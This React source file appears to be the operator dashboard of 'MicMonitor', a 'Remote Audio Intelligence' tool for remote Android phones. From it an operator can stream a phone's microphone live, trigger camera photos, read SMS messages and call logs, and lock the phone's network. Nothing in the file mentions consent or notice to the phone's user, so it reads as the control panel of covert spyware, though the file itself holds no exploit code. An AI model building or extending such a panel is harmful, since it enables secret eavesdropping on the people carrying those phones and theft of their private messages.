import { useState, useCallback, useEffect, useRef, memo } from 'react';
import { ControlButtons } from './components/dashboard/ControlButtons';
import { DeviceInfoPanel } from './components/dashboard/DeviceInfoPanel';
import { NetworkProfile } from './components/dashboard/NetworkProfile';
import { SMSPanel } from './components/dashboard/SMSPanel';
import { CallsPanel } from './components/dashboard/CallsPanel';
import { EventLog } from './components/dashboard/EventLog';
import { CameraPanel } from './components/dashboard/CameraPanel';
import { DeviceFleetList } from './components/dashboard/DeviceFleetList';
import { useDashboard } from './hooks/useDashboard';
import { useAudioPlayback } from './hooks/useAudioPlayback';

function App() {
  const audioPlayback = useAudioPlayback();

  // Stable refs to avoid re-render loops when these objects change
  const audioPlaybackRef = useRef(audioPlayback);
  audioPlaybackRef.current = audioPlayback;
  const [now, setNow] = useState(new Date());

  // Live clock — update every second
  useEffect(() => {
    const t = setInterval(() => setNow(new Date()), 1000);
    return () => clearInterval(t);
  }, []);

  const formatTime = d => d.toLocaleTimeString('en-US', {
    hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit',
  });
  const formatDate = d => d.toLocaleDateString('en-US', {
    weekday: 'short', month: 'short', day: 'numeric', year: 'numeric',
  });

  // CRITICAL: Empty dependency arrays to prevent WebSocket reconnect floods.
  const handleAudioData = useCallback((data, deviceId) => {
    audioPlaybackRef.current.feedAudio(data, deviceId);
  }, []);

  const {
    wsState, isColdStarting, devices, selectedDevice, selectedDeviceId,
    feed, photos, pendingCommands, toasts, wsReconnectAt,
    setSelectedDeviceId, sendCommand, reconnectNow, ws,
  } = useDashboard(handleAudioData);

  const [isListening, setIsListening] = useState(false);
  const isListeningRef = useRef(false);
  const sendCommandRef = useRef(sendCommand);
  sendCommandRef.current = sendCommand;

  const handleCommand = useCallback((cmd, extra) => {
    if (cmd === 'start_stream') {
      audioPlaybackRef.current.start();
      setIsListening(true);
      isListeningRef.current = true;
    } else if (cmd === 'stop_stream') {
      audioPlaybackRef.current.stop();
      setIsListening(false);
      isListeningRef.current = false;
    }
    sendCommandRef.current(cmd, extra);
  }, []);

  // Ensure audio playback is running while listening
  useEffect(() => {
    if (isListening && !audioPlaybackRef.current.state.isPlaying) {
      audioPlaybackRef.current.start();
    }
  }, [isListening]);

  useEffect(() => {
    audioPlaybackRef.current.setTargetDevice(selectedDeviceId || null);
  }, [selectedDeviceId]);

  // Auto-resend subscriptions on reconnect
  const wsResubscribedRef = useRef(false);
  useEffect(() => {
    if (wsState === 'open') {
      if (wsResubscribedRef.current) return;
      wsResubscribedRef.current = true;
      if (isListeningRef.current && selectedDeviceId) {
        const timer = setTimeout(() => {
          sendCommandRef.current('start_stream');
        }, 300);
        return () => clearTimeout(timer);
      }
    } else {
      wsResubscribedRef.current = false;
    }
  }, [wsState, selectedDeviceId]);

  const isConnected = wsState === 'open';
  const isStreaming = isListening || audioPlayback.state.isPlaying;
  const health = selectedDevice?.health;
  const selectedDeviceLabel = selectedDevice?.model || 'Unknown device';
  const selectedDeviceShortId = selectedDevice?.deviceId ? selectedDevice.deviceId.slice(0, 8) : null;
  const reconnectIn = wsReconnectAt ? Math.max(0, Math.ceil((wsReconnectAt - now.getTime()) / 1000)) : null;
  const lockCommand = health?.networkLocked ? 'unlock_network' : 'lock_network';
  const lockStatus = selectedDeviceId ? pendingCommands[`${selectedDeviceId}:${lockCommand}`]?.status : null;
  const lockPending = lockStatus === 'sending' || lockStatus === 'queued';
  const lockDisabled = lockPending || !isConnected || !selectedDeviceId;

  return (
    <div style={{ position: 'relative', minHeight: '100vh', overflow: 'hidden', color: '#f4f4f5', background: '#09090b', fontFamily: "'Inter', sans-serif" }}>
      <ToastStack toasts={toasts} />
      <div className="pointer-events-none absolute inset-0">
        <div className="dashboard-grid-overlay" />
      </div>

      <div style={{ position: 'relative', zIndex: 10 }}>
        {/* ─── TOP HEADER BAR ──────────────────────────────────────── */}
        <header style={{
          position: 'sticky', top: 0, zIndex: 50,
          padding: '10px 20px', background: '#09090b',
          borderBottom: '1px solid rgba(63,63,70,0.4)',
        }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', maxWidth: 1440, margin: '0 auto' }}>
            {/* Brand */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <div style={{ position: 'relative' }}>
                <div style={{
                  width: 36, height: 36, borderRadius: 10,
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                  fontWeight: 900, fontSize: 16, color: '#000', background: '#fff',
                  border: '2px solid #3f3f46',
                }}>M</div>
                {isStreaming && (
                  <span style={{
                    position: 'absolute', top: -4, right: -4,
                    width: 10, height: 10, borderRadius: '50%',
                    background: '#10b981', border: '2px solid #09090b',
                    animation: 'beatBar 0.8s ease-in-out infinite alternate',
                  }} />
                )}
              </div>
              <div>
                <h1 style={{ fontSize: 14, fontWeight: 800, letterSpacing: '0.03em', color: '#f4f4f5', margin: 0 }}>
                  MicMonitor
                </h1>
                <p style={{ fontSize: 9, color: '#52525b', textTransform: 'uppercase', letterSpacing: '0.14em', fontWeight: 600, margin: 0 }}>
                  Remote Audio Intelligence
                </p>
              </div>
            </div>

            {/* Center stats */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }} className="hidden md:flex">
              <StatPill icon="📱" label="Devices" value={String(devices.length)} color={devices.length > 0 ? '#10b981' : '#52525b'} />
              <StatPill icon="🎙" label="Audio" value={isStreaming ? 'LIVE' : 'IDLE'} color={isStreaming ? '#10b981' : '#52525b'} pulse={isStreaming} />
              <StatPill icon="📶" label="Net" value={health?.lowNetwork ? 'LOW' : 'HQ'} color={health?.lowNetwork ? '#f59e0b' : '#818cf8'} />
              <StatPill icon="🔋" label="Batt" value={health?.batteryPct != null ? `${health.batteryPct}%` : '—'} color={health?.batteryPct != null && health.batteryPct < 20 ? '#ef4444' : '#52525b'} />
            </div>

            {/* Right — clock + WS */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <div style={{ textAlign: 'right' }} className="hidden sm:block">
                <div style={{ fontSize: 13, fontFamily: "'IBM Plex Mono', monospace", fontWeight: 600, color: '#fff', letterSpacing: '0.08em' }}>
                  {formatTime(now)}
                </div>
                <div style={{ fontSize: 9, color: '#52525b' }}>{formatDate(now)}</div>
              </div>
              <WsStatusBadge state={wsState} isColdStarting={isColdStarting} />
            </div>
          </div>
        </header>

        <NetworkBanner state={wsState} isColdStarting={isColdStarting} retryIn={reconnectIn} onRetry={reconnectNow} />

        {/* Mobile stats strip */}
        <div style={{ padding: '10px 20px 0' }} className="md:hidden">
          <div style={{ display: 'flex', gap: 8, overflowX: 'auto', paddingBottom: 4, maxWidth: 1440, margin: '0 auto' }}>
            <StatPill icon="📱" label="Devices" value={String(devices.length)} color={devices.length > 0 ? '#10b981' : '#52525b'} />
            <StatPill icon="🎙" label="Audio" value={isStreaming ? 'LIVE' : 'IDLE'} color={isStreaming ? '#10b981' : '#52525b'} pulse={isStreaming} />
            <StatPill icon="📶" label="Net" value={health?.lowNetwork ? 'LOW' : 'HQ'} color={health?.lowNetwork ? '#f59e0b' : '#818cf8'} />
            <StatPill icon="🔋" label="Batt" value={health?.batteryPct != null ? `${health.batteryPct}%` : '—'} color={health?.batteryPct != null && health.batteryPct < 20 ? '#ef4444' : '#52525b'} />
          </div>
        </div>

        {/* ─── LIVE AUDIO INDICATOR ──────────────────────────────── */}
        {isStreaming && (
          <div style={{
            padding: '6px 20px', background: 'rgba(16,185,129,0.06)',
            borderBottom: '1px solid rgba(16,185,129,0.15)',
          }}>
            <div style={{ maxWidth: 1440, margin: '0 auto', display: 'flex', alignItems: 'center', gap: 10 }}>
              <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#10b981', animation: 'beatBar 0.8s ease-in-out infinite alternate' }} />
              <span style={{ fontSize: 11, fontWeight: 700, color: '#34d399', textTransform: 'uppercase', letterSpacing: '0.08em' }}>
                Live Audio Active
              </span>
              <StatusTag label="Status" value={audioPlayback.state.playbackStatus || 'Live'} tone={audioPlayback.state.playbackStatus === 'Lagging' ? 'warn' : 'good'} />
              {(audioPlayback.state.lowNetwork || health?.lowNetwork) && <StatusTag label="Net" value="Low-BW" tone="warn" />}
              <div style={{ flex: 1, height: 1, background: 'rgba(16,185,129,0.12)' }} />
              <LiveBeatBars />
            </div>
          </div>
        )}

        {/* ─── SELECTED DEVICE BANNER ────────────────────────────── */}
        {selectedDevice && (
          <div style={{ padding: '10px 20px 0' }}>
            <div style={{
              maxWidth: 1440, margin: '0 auto', borderRadius: 14,
              padding: '12px 16px', background: 'rgba(24,24,27,0.7)',
              border: '1px solid rgba(63,63,70,0.35)',
            }}>
              <div style={{ display: 'flex', flexWrap: 'wrap', alignItems: 'center', justifyContent: 'space-between', gap: 12 }}>
                <div>
                  <h2 style={{ fontSize: 16, fontWeight: 800, display: 'flex', alignItems: 'center', gap: 8, margin: 0 }}>
                    <span style={{ fontSize: 20 }}>📱</span> {selectedDeviceLabel}
                    {selectedDeviceShortId && (
                      <span style={{
                        padding: '2px 8px', borderRadius: 6, fontSize: 10,
                        fontFamily: "'IBM Plex Mono', monospace", fontWeight: 500,
                        background: '#27272a', border: '1px solid #3f3f46', color: '#71717a',
                      }}>{selectedDeviceShortId}</span>
                    )}
                  </h2>
                </div>
                <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                  <StatusTag label="WS" value={health?.wsConnected === false ? 'Offline' : 'Online'} tone={health?.wsConnected === false ? 'bad' : 'good'} />
                  <StatusTag label="Net" value={health?.internetOnline === false ? 'Down' : 'Up'} tone={health?.internetOnline === false ? 'bad' : 'good'} />
                  <StatusTag label="Mic" value={health?.micCapturing ? 'Active' : 'Idle'} tone={health?.micCapturing ? 'good' : 'neutral'} />
                  <StatusTag label="Cam" value="Photo" tone="neutral" />
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ─── MAIN CONTENT ─────────────────────────────────────── */}
        <main style={{ padding: '16px 20px 40px', maxWidth: 1440, margin: '0 auto' }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>

            {/* Device Fleet */}
            {devices.length > 0 && (
              <DeviceFleetList
                devices={devices}
                selectedDeviceId={selectedDeviceId}
                setSelectedDeviceId={setSelectedDeviceId}
                onCommand={handleCommand}
                pendingCommands={pendingCommands}
              />
            )}

            {/* No device placeholder */}
            {devices.length === 0 && (
              <div className="glass-card" style={{ padding: '48px 20px', textAlign: 'center' }}>
                <div style={{ fontSize: 48, marginBottom: 12, opacity: 0.25 }}>📡</div>
                <div style={{ fontSize: 15, fontWeight: 600, color: '#d4d4d8', marginBottom: 6 }}>
                  Waiting for device…
                </div>
                <div style={{ fontSize: 12, color: '#52525b' }}>
                  Make sure the Android app is running and connected to the internet.
                </div>
                <div style={{ marginTop: 12, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}>
                  <span style={{ width: 6, height: 6, borderRadius: '50%', background: isConnected ? '#10b981' : '#ef4444', animation: isConnected ? 'none' : 'beatBar 0.8s ease-in-out infinite alternate' }} />
                  <span style={{ fontSize: 11, color: '#52525b' }}>
                    {isConnected ? 'Server connected — listening for devices' : 'Connecting to server…'}
                  </span>
                </div>
              </div>
            )}

            {selectedDevice && (
              <>
                {/* Network profile strip */}
                <NetworkProfile
                  lowNetwork={health?.lowNetwork}
                  streamCodec={health?.streamCodec}
                  streamCodecMode={health?.streamCodecMode}
                  onForceToggle={() => handleCommand('set_low_network', { enabled: !health?.lowNetwork })}
                  isStreaming={isStreaming}
                  connQuality={health?.connQuality}
                  netType={health?.netType}
                  isConnected={isConnected}
                  deviceId={selectedDeviceId}
                  pendingCommands={pendingCommands}
                />

                {/* ── Top row: Device Info + Controls ─────────── */}
                <div className="grid grid-cols-1 xl:grid-cols-[3fr_2fr] gap-4">
                  {/* Left — Device Info + Event Log */}
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
                    <DeviceInfoPanel device={selectedDevice} audioState={audioPlayback.state} />
                    <EventLog events={feed} />
                  </div>

                  {/* Right — Controls */}
                  <div className="glass-card" style={{ padding: 16 }}>
                    <div className="section-label">Controls</div>
                    <ControlButtons
                      onCommand={handleCommand}
                      health={selectedDevice?.health}
                      isStreaming={isStreaming}
                      isConnected={isConnected}
                      deviceId={selectedDeviceId}
                      pendingCommands={pendingCommands}
                    />

                    {/* Network Lock */}
                    <div style={{ marginTop: 16, paddingTop: 14, borderTop: '1px solid rgba(63,63,70,0.3)' }}>
                      <button
                        onClick={() => handleCommand(health?.networkLocked ? 'unlock_network' : 'lock_network')}
                        disabled={lockDisabled}
                        style={{
                          width: '100%', padding: '10px 14px', borderRadius: 12,
                          fontSize: 12, fontWeight: 700, cursor: lockDisabled ? 'not-allowed' : 'pointer',
                          display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6,
                          background: health?.networkLocked ? 'rgba(239,68,68,0.08)' : 'rgba(16,185,129,0.08)',
                          border: `1px solid ${health?.networkLocked ? 'rgba(239,68,68,0.3)' : 'rgba(16,185,129,0.3)'}`,
                          color: health?.networkLocked ? '#f87171' : '#34d399',
                          transition: 'all 0.2s', opacity: lockDisabled ? 0.5 : 1,
                        }}
                      >
                        {health?.networkLocked ? '🔓 Unlock Device Network' : '🔒 Lock Device Network'}
                      </button>
                    </div>
                  </div>
                </div>

                {/* ── Camera + SMS + Calls row ────────────────── */}
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
                  <CameraPanel
                    photos={photos}
                    onCommand={handleCommand}
                    health={health}
                    isConnected={isConnected}
                    deviceId={selectedDeviceId}
                    pendingCommands={pendingCommands}
                  />
                  <SMSPanel messages={selectedDevice?.sms || []} />
                  <CallsPanel calls={selectedDevice?.calls || []} />
                </div>
              </>
            )}
          </div>
        </main>
      </div>
    </div>
  );
}

// ── Shared sub-components ────────────────────────────────────────────

const StatPill = memo(function StatPill({ icon, label, value, color, pulse = false }) {
  return (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 8,
      padding: '5px 12px', borderRadius: 10,
      background: 'rgba(24,24,27,0.6)', border: '1px solid rgba(63,63,70,0.35)',
      whiteSpace: 'nowrap', flexShrink: 0,
    }}>
      <span style={{ fontSize: 13 }}>{icon}</span>
      <div>
        <div style={{ fontSize: 8, textTransform: 'uppercase', letterSpacing: '0.12em', color: '#52525b', fontWeight: 600 }}>{label}</div>
        <div style={{ fontSize: 11, fontWeight: 700, color, display: 'flex', alignItems: 'center', gap: 4 }}>
          {pulse && <span style={{ width: 5, height: 5, borderRadius: '50%', background: 'currentColor', animation: 'beatBar 0.8s ease-in-out infinite alternate' }} />}
          {value}
        </div>
      </div>
    </div>
  );
});

function WsStatusBadge({ state, isColdStarting }) {
  const isWaking = isColdStarting && state === 'connecting';
  const config = {
    open: { color: '#10b981', bg: 'rgba(16,185,129,0.1)', border: 'rgba(16,185,129,0.25)', label: 'Connected', dot: false },
    connecting: {
      color: isWaking ? '#818cf8' : '#f59e0b',
      bg: isWaking ? 'rgba(129,140,248,0.1)' : 'rgba(245,158,11,0.1)',
      border: isWaking ? 'rgba(129,140,248,0.25)' : 'rgba(245,158,11,0.25)',
      label: isWaking ? 'Waking (~50s)…' : 'Connecting…', dot: true,
    },
    closed: { color: '#ef4444', bg: 'rgba(239,68,68,0.1)', border: 'rgba(239,68,68,0.25)', label: 'Disconnected', dot: true },
  }[state] || { color: '#52525b', bg: 'rgba(82,82,91,0.1)', border: 'rgba(82,82,91,0.25)', label: state, dot: false };

  return (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 6,
      padding: '5px 12px', borderRadius: 10,
      fontSize: 11, fontWeight: 600, whiteSpace: 'nowrap',
      background: config.bg, border: `1px solid ${config.border}`, color: config.color,
    }}>
      <span style={{
        width: 6, height: 6, borderRadius: '50%', background: 'currentColor',
        animation: config.dot ? 'beatBar 0.8s ease-in-out infinite alternate' : 'none',
      }} />
      {config.label}
    </div>
  );
}

function StatusTag({ label, value, tone }) {
  const palette = {
    good: { bg: 'rgba(16,185,129,0.12)', border: 'rgba(16,185,129,0.3)', color: '#6ee7b7' },
    warn: { bg: 'rgba(245,158,11,0.12)', border: 'rgba(245,158,11,0.3)', color: '#fcd34d' },
    bad: { bg: 'rgba(239,68,68,0.12)', border: 'rgba(239,68,68,0.3)', color: '#fca5a5' },
    neutral: { bg: 'rgba(82,82,91,0.12)', border: 'rgba(82,82,91,0.3)', color: '#a1a1aa' },
  };
  const s = palette[tone];
  return (
    <span style={{
      display: 'inline-flex', alignItems: 'center', gap: 4,
      padding: '3px 8px', borderRadius: 20,
      fontSize: 9, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.06em',
      background: s.bg, border: `1px solid ${s.border}`, color: s.color,
    }}>
      <span style={{ fontSize: 8, opacity: 0.65 }}>{label}</span>
      <span>{value}</span>
    </span>
  );
}

function NetworkBanner({ state, isColdStarting, retryIn, onRetry }) {
  if (state === 'open') return null;
  const isConnecting = state === 'connecting';
  const accent = isConnecting ? '#f59e0b' : '#ef4444';
  const bg = isConnecting ? 'rgba(245,158,11,0.06)' : 'rgba(239,68,68,0.06)';
  const border = isConnecting ? 'rgba(245,158,11,0.2)' : 'rgba(239,68,68,0.2)';
  const label = isConnecting ? (isColdStarting ? 'Waking server' : 'Reconnecting') : 'Connection lost';
  const detail = retryIn != null ? `Retrying in ${retryIn}s` : 'Retrying soon';

  return (
    <div style={{ padding: '10px 20px 0' }}>
      <div style={{
        maxWidth: 1440, margin: '0 auto', borderRadius: 12,
        padding: '8px 14px', display: 'flex', alignItems: 'center', gap: 10,
        background: bg, border: `1px solid ${border}`,
      }}>
        <span style={{ width: 6, height: 6, borderRadius: '50%', background: accent, boxShadow: `0 0 10px ${accent}` }} />
        <span style={{ fontSize: 11, fontWeight: 700, color: accent }}>{label}</span>
        <span style={{ fontSize: 10, color: '#52525b' }}>{detail}</span>
        <div style={{ marginLeft: 'auto' }}>
          <button onClick={onRetry} style={{
            fontSize: 10, fontWeight: 700, padding: '4px 12px', borderRadius: 20,
            background: 'rgba(15,23,42,0.5)', border: '1px solid rgba(148,163,184,0.15)',
            color: '#d4d4d8', cursor: 'pointer', transition: 'background 0.15s',
          }}>Retry now</button>
        </div>
      </div>
    </div>
  );
}

function ToastStack({ toasts }) {
  if (!toasts || toasts.length === 0) return null;
  const colorMap = { success: '#34d399', error: '#f87171', info: '#60a5fa', warning: '#f59e0b' };
  return (
    <div style={{ position: 'fixed', top: 16, right: 16, zIndex: 90, display: 'flex', flexDirection: 'column', gap: 6 }}>
      {toasts.map(t => (
        <div key={t.id} style={{
          display: 'flex', alignItems: 'center', gap: 6,
          padding: '6px 14px', borderRadius: 20,
          fontSize: 11, fontWeight: 600,
          background: 'rgba(9,9,11,0.92)', border: '1px solid rgba(63,63,70,0.55)',
          boxShadow: '0 8px 24px rgba(0,0,0,0.4)',
          animation: 'slideDown 0.2s ease',
        }}>
          <span style={{ width: 6, height: 6, borderRadius: '50%', background: colorMap[t.type] || colorMap.info }} />
          <span style={{ color: '#f4f4f5' }}>{t.message}</span>
          {t.deviceId && <span style={{ fontSize: 9, fontFamily: "'IBM Plex Mono', monospace", color: '#52525b', marginLeft: 4 }}>#{String(t.deviceId).slice(0, 8)}</span>}
        </div>
      ))}
    </div>
  );
}

const LIVE_BAR_HEIGHTS = [26, 48, 36, 62, 43, 72, 38, 66, 30, 58, 41, 70];
const LIVE_BAR_DURATIONS = [0.55, 0.64, 0.51, 0.73, 0.58, 0.66, 0.62, 0.74, 0.57, 0.69, 0.61, 0.76];
function LiveBeatBars() {
  return (
    <div style={{ display: 'flex', alignItems: 'flex-end', gap: 1.5, height: 16 }}>
      {LIVE_BAR_HEIGHTS.map((h, i) => (
        <div key={i} style={{
          width: 2.5, borderRadius: 1.5,
          height: `${h}%`,
          background: `hsl(${160 + i * 4}, 70%, 55%)`,
          animation: `beatBar ${LIVE_BAR_DURATIONS[i]}s ease-in-out infinite alternate`,
          animationDelay: `${i * 0.07}s`,
        }} />
      ))}
    </div>
  );
}

export default App;
